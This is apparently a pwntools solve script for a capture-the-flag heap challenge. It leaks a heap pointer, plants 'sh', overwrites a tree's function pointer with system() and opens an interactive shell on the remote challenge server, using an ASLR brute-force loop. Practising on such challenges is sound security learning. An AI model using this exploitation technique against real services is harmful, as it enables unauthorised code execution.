from pwn import *


def add(sz, content, price):
    if len(content) < sz:
        content += b"\n"
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Length: ", str(sz).encode())
    io.sendafter(b"Content: ", content)
    io.sendlineafter(b"Price: ", str(price).encode())


def peak():
    io.sendlineafter(b"> ", b"2")


def pop():
    io.sendlineafter(b"> ", b"3")


def free():
    io.sendlineafter(b"> ", b"4")


MAX_NODES = 64
TREE_SIZE = MAX_NODES * 8 + 8 + 8

# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

elf = ELF("./main")
# io = process("./main")
# io = gdb.debug("./main", "c", aslr=False)
io = remote("ictf2.maple3142.net", 1225)
free()
add(TREE_SIZE, b"peko", 0)
peak()
io.recvuntil(b"Content: ")
present_addr = int.from_bytes(io.recvn(6), "little")
print(f"{present_addr = :#x}")
add(2, b"sh", 0)
sh_addr = present_addr + 0x20 + 0x20
print(f"{sh_addr = :#x}")

system = elf.plt["system"]
print(f"{system = :#x}")
payload = flat(
    {
        0: sh_addr,
        MAX_NODES * 8: 10,
        MAX_NODES * 8 + 8: system + 0x4000,  # 1/16 success, 0x4000 is for aslr off
    }
)[:-6]
assert len(payload) == TREE_SIZE - 6
free()
add(TREE_SIZE - 6, payload, 0)
pop()

io.interactive()
# while true; do python solve.py; done
